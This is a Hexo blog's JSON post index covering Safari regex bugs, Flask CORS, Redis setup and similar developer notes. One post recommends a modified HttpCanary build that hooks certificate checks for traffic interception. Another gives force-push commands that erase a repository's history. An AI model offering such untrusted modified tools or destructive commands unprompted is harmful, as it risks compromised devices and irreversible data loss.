RegExp(&quot;(?=\\\\[buy])(\\\\S*)(\\\\[/buy]=?)&quot;, &quot;g&quot;);var task = new RegExp(&quot;(?=\\\\[task])(\\\\S*)(\\\\[/task]=?)&quot;, &quot;g&quot;);var warning = new RegExp(&quot;(?=\\\\[warning])(\\\\S*)(\\\\[/warning]=?)&quot;, &quot;g&quot;); 错误分析","text":"Halo某主题代码渲染出现问题，查看控制台发现报错如下： 定位到错误代码： 12345var reg = new RegExp(&quot;(?&lt;=]).+(?=\\\\[/)&quot;, &quot;g&quot;);var noway = new RegExp(&quot;(?=\\\\[noway])(\\\\S*)(\\\\[/noway]=?)&quot;, &quot;g&quot;);var buy = new RegExp(&quot;(?=\\\\[buy])(\\\\S*)(\\\\[/buy]=?)&quot;, &quot;g&quot;);var task = new RegExp(&quot;(?=\\\\[task])(\\\\S*)(\\\\[/task]=?)&quot;, &quot;g&quot;);var warning = new RegExp(&quot;(?=\\\\[warning])(\\\\S*)(\\\\[/warning]=?)&quot;, &quot;g&quot;); 错误分析根据控制台报错，问题出现在正则匹配式上。尝试在Chrome上运行该行代码，无报错，至此可以肯定是浏览器的兼容性问题。 经查阅发现Safari不支持零宽断言，即?&lt;=、?=，解决办法是使用其它表达式替换零宽断言。","categories":[{"name":"踩坑记录📝","slug":"踩坑记录📝","permalink":"https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"}],"tags":[{"name":"正则","slug":"正则","permalink":"https://qilianshuo.github.io/tags/%E6%AD%A3%E5%88%99/"},{"name":"Safari","slug":"Safari","permalink":"https://qilianshuo.github.io/tags/Safari/"}]},{"title":"Android11使用HttpCanary","slug":"Android11使用HttpCanary","date":"2022-02-12T13:55:22.000Z","updated":"2022-03-21T08:54:44.399Z","comments":true,"path":"2022/02/12/Android11使用HttpCanary/","link":"","permalink":"https://qilianshuo.github.io/2022/02/12/Android11%E4%BD%BF%E7%94%A8HttpCanary/","excerpt":"Android11更改了CA证书安装机制，为保证安全关闭了第三方应用安装证书的接口，只能通过系统设置安装证书。 HttpCanary只有在安装完证书后才能导出pem密钥，这也导致其在Android11上无法使用。 目前的解决办法通常是从软件的缓存目录中提取出CA证书然后在设置中安装，但需要root权限才能访问/data目录。 最近发现了针对证书问题的修改版，hook证书安装验证函数，使软件得到的数据始终为已安装证书，这样就可以导出证书去设置里安装。搬运文件下载地址。","text":"Android11更改了CA证书安装机制，为保证安全关闭了第三方应用安装证书的接口，只能通过系统设置安装证书。 HttpCanary只有在安装完证书后才能导出pem密钥，这也导致其在Android11上无法使用。 目前的解决办法通常是从软件的缓存目录中提取出CA证书然后在设置中安装，但需要root权限才能访问/data目录。 最近发现了针对证书问题的修改版，hook证书安装验证函数，使软件得到的数据始终为已安装证书，这样就可以导出证书去设置里安装。搬运文件下载地址。 ⚠️注： 证书导出方法： 设置 -&gt; HttpCanary根证书 -&gt; 导出HttpCanary根证书 -&gt; Privacy Enhanced Mai(.pem) 导出位置为~/HttpCanary/certs 设置中安装证书 不同品牌手机存在差异，通常在安全分类中，或直接在设置中搜索安装证书、CA证书等关键字。","categories":[{"name":"逆向","slug":"逆向","permalink":"https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"抓包","slug":"抓包","permalink":"https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"}]},{"title":"Flask跨域方案","slug":"Flask跨域方案","date":"2022-02-08T08:28:55.000Z","updated":"2022-03-21T08:54:32.520Z","comments":true,"path":"2022/02/08/Flask跨域方案/","link":"","permalink":"https://qilianshuo.github.io/2022/02/08/Flask%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/","excerpt":"很容易搜索到多种解决方法，暂先记录几种最简单的。 为response添加headers 使用make_response先创建响应，再给响应添加headers 12345@app.route(&#x27;/&#x27;)def index(): rsp = make_response(&#x27;Hello world.&#x27;) rsp.headers[&#x27;Access-Control-Allow-Origin&#x27;] = &#x27;*&#x27; return rsp return响应三元组(response, status, headers)","text":"很容易搜索到多种解决方法，暂先记录几种最简单的。 为response添加headers 使用make_response先创建响应，再给响应添加headers 12345@app.route(&#x27;/&#x27;)def index(): rsp = make_response(&#x27;Hello world.&#x27;) rsp.headers[&#x27;Access-Control-Allow-Origin&#x27;] = &#x27;*&#x27; return rsp return响应三元组(response, status, headers) 123@app.route(&#x27;/&#x27;)def index(): return &#x27;Hello world&#x27;, 200, &#123;&#x27;Access-Control-Allow-Origin&#x27;:&#x27;*&#x27;&#125; 注册请求回调添加headers当大量路由都需要允许跨域时，为每个路由逐个添加变得非常麻烦且不易维护。这时可以使用Flask提供的回调接口为请求注册回调，自动添加Access-Control-Allow-Origin的header。 123456@app.after_requestdef headers_hook(response): if request.method == &#x27;GET&#x27;: response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = &#x27;*&#x27; return response# 同样可以将app替换为蓝图在局部开启跨域","categories":[{"name":"开发","slug":"开发","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://qilianshuo.github.io/tags/Flask/"},{"name":"跨域","slug":"跨域","permalink":"https://qilianshuo.github.io/tags/%E8%B7%A8%E5%9F%9F/"}]},{"title":"Python使用redis","slug":"Python使用redis","date":"2022-02-06T08:42:53.000Z","updated":"2022-03-21T08:53:34.912Z","comments":true,"path":"2022/02/06/Python使用redis/","link":"","permalink":"https://qilianshuo.github.io/2022/02/06/Python%E4%BD%BF%E7%94%A8redis/","excerpt":"安装Redis模块Python无内置redis工具，需先安装redis模块： 1pip3 install redis 连接数据库12345import redisr = redis.StrictRedis(host=&#x27;localhost&#x27;, port=6379, decode_responses=True)r.set(&#x27;name&#x27;, &#x27;Lihua&#x27;)print(r[&#x27;name&#x27;])print(r.get(&#x27;name&#x27;)","text":"安装Redis模块Python无内置redis工具，需先安装redis模块： 1pip3 install redis 连接数据库12345import redisr = redis.StrictRedis(host=&#x27;localhost&#x27;, port=6379, decode_responses=True)r.set(&#x27;name&#x27;, &#x27;Lihua&#x27;)print(r[&#x27;name&#x27;])print(r.get(&#x27;name&#x27;) redis 提供两个类 Redis 和 StrictRedis, StrictRedis 用于实现大部分官方的命令，Redis 是 StrictRedis 的子类，用于向后兼用旧版本。 redis 取出的结果默认是字节，可以设定 decode_responses=True 改成字符串。 连接池redis-py 使用 connection pool 来管理对一个 redis server 的所有连接，避免每次建立、释放连接的开销。 默认，每个Redis实例都会维护一个自己的连接池。可以直接建立一个连接池，然后作为参数 Redis，这样就可以实现多个 Redis 实例共享一个连接池。 123import redispool = redis.ConnectionPool(host=&#x27;localhost&#x27;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool) String操作TODO…… List操作TODO…… Set操作……TODO…… 常用操作遍历全部key……","categories":[{"name":"开发","slug":"开发","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"redis","slug":"redis","permalink":"https://qilianshuo.github.io/tags/redis/"},{"name":"Python","slug":"Python","permalink":"https://qilianshuo.github.io/tags/Python/"}]},{"title":"Mac安装Reids并配置","slug":"Mac安装Reids并配置","date":"2022-02-04T13:43:24.000Z","updated":"2022-03-21T08:53:51.859Z","comments":true,"path":"2022/02/04/Mac安装Reids并配置/","link":"","permalink":"https://qilianshuo.github.io/2022/02/04/Mac%E5%AE%89%E8%A3%85Reids%E5%B9%B6%E9%85%8D%E7%BD%AE/","excerpt":"安装 使用Homebrew安装 安装命令： 1brew install redis 12345678910==&gt; Downloading https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles/redis-6.2.6.monte######################################################################## 100.0%==&gt; Pouring redis-6.2.6.monterey.bottle.tar.gz==&gt; CaveatsTo restart redis after an upgrade: brew services restart redisOr, if you don&#x27;t want/need a background service you can just run: /usr/local/opt/redis/bin/redis-server /usr/local/etc/redis.conf==&gt; Summary🍺 /usr/local/Cellar/redis/6.2.6: 14 files, 2.0MB","text":"安装 使用Homebrew安装 安装命令： 1brew install redis 12345678910==&gt; Downloading https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles/redis-6.2.6.monte######################################################################## 100.0%==&gt; Pouring redis-6.2.6.monterey.bottle.tar.gz==&gt; CaveatsTo restart redis after an upgrade: brew services restart redisOr, if you don&#x27;t want/need a background service you can just run: /usr/local/opt/redis/bin/redis-server /usr/local/etc/redis.conf==&gt; Summary🍺 /usr/local/Cellar/redis/6.2.6: 14 files, 2.0MB 下载bin文件并配置环境变量 日后更新(///▽///) 配置配置文件路径： /usr/local/opt/redis/bin/redis-server、 /usr/local/etc/redis.conf 配置项 说明 port 6379 指定 Redis 监听端口，默认端口为 6379 bind 127.0.0.1 绑定的主机地址 databases 16 设置数据库的数量，默认数据库为0，可以使用SELECT 命令在连接上指定数据库id save &lt;seconds&gt; &lt;changes&gt; 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合 rdbcompression yes 指定存储至本地数据库时是否压缩数据，默认为 yes，Redis 采用 LZF 压缩，如果为了节省 CPU 时间，可以关闭该选项，但会导致数据库文件变的巨大 dbfilename dump.rdb 指定本地数据库文件名，默认值为 dump.rdb dir ./ 指定本地数据库存放目录 include /path/to/local.conf 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件 维护 查看redis进程 1ps axu | grep redis 启动、关闭redis服务 123brew services start redisbrew services stop redisbrew services restart redis ……","categories":[{"name":"开发","slug":"开发","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://qilianshuo.github.io/tags/Redis/"},{"name":"数据库","slug":"数据库","permalink":"https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"GitHub删除所有提交历史","slug":"GitHub删除所有提交历史","date":"2022-02-04T04:02:24.000Z","updated":"2022-03-21T08:55:50.096Z","comments":true,"path":"2022/02/04/GitHub删除所有提交历史/","link":"","permalink":"https://qilianshuo.github.io/2022/02/04/GitHub%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2/","excerpt":"效果将代码保持在当前状态，清空commit history。 思路创建新分支 -&gt; 将文件添加到新分支 -&gt; 提交更改 -&gt; 删除旧master分支 -&gt; 重命名新分支 -&gt; 强制更新仓库 步骤","text":"效果将代码保持在当前状态，清空commit history。 思路创建新分支 -&gt; 将文件添加到新分支 -&gt; 提交更改 -&gt; 删除旧master分支 -&gt; 重命名新分支 -&gt; 强制更新仓库 步骤 创建新分支 1git checkout --orphan latest_branch 将文件添加到新分支 1git add -A 提交更改 1git commit -am &quot;Init new branch&quot; 删除旧master分支 1git branch -D master 重命名新分支 1git branch -m master 强制更新仓库 1git push -f origin master","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"git","slug":"git","permalink":"https://qilianshuo.github.io/tags/git/"}]},{"title":"Hello World","slug":"hello-world","date":"2022-02-04T03:29:52.358Z","updated":"2022-02-04T03:29:52.358Z","comments":true,"path":"2022/02/04/hello-world/","link":"","permalink":"https://qilianshuo.github.io/2022/02/04/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"逆向","slug":"逆向","permalink":"https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"},{"name":"踩坑记录📝","slug":"踩坑记录📝","permalink":"https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"},{"name":"算法","slug":"算法","permalink":"https://qilianshuo.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"开发","slug":"开发","permalink":"https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"密码","slug":"密码","permalink":"https://qilianshuo.github.io/tags/%E5%AF%86%E7%A0%81/"},{"name":"抓包","slug":"抓包","permalink":"https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"},{"name":"小程序","slug":"小程序","permalink":"https://qilianshuo.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"js异步","slug":"js异步","permalink":"https://qilianshuo.github.io/tags/js%E5%BC%82%E6%AD%A5/"},{"name":"素数","slug":"素数","permalink":"https://qilianshuo.github.io/tags/%E7%B4%A0%E6%95%B0/"},{"name":"算法","slug":"算法","permalink":"https://qilianshuo.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"RSSI","slug":"RSSI","permalink":"https://qilianshuo.github.io/tags/RSSI/"},{"name":"定位","slug":"定位","permalink":"https://qilianshuo.github.io/tags/%E5%AE%9A%E4%BD%8D/"},{"name":"Mac OS","slug":"Mac-OS","permalink":"https://qilianshuo.github.io/tags/Mac-OS/"},{"name":"快捷键","slug":"快捷键","permalink":"https://qilianshuo.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"正则","slug":"正则","permalink":"https://qilianshuo.github.io/tags/%E6%AD%A3%E5%88%99/"},{"name":"Safari","slug":"Safari","permalink":"https://qilianshuo.github.io/tags/Safari/"},{"name":"Flask","slug":"Flask","permalink":"https://qilianshuo.github.io/tags/Flask/"},{"name":"跨域","slug":"跨域","permalink":"https://qilianshuo.github.io/tags/%E8%B7%A8%E5%9F%9F/"},{"name":"数据库","slug":"数据库","permalink":"https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"redis","slug":"redis","permalink":"https://qilianshuo.github.io/tags/redis/"},{"name":"Python","slug":"Python","permalink":"https://qilianshuo.github.io/tags/Python/"},{"name":"Redis","slug":"Redis","permalink":"https://qilianshuo.github.io/tags/Redis/"},{"name":"git","slug":"git","permalink":"https://qilianshuo.github.io/tags/git/"}]}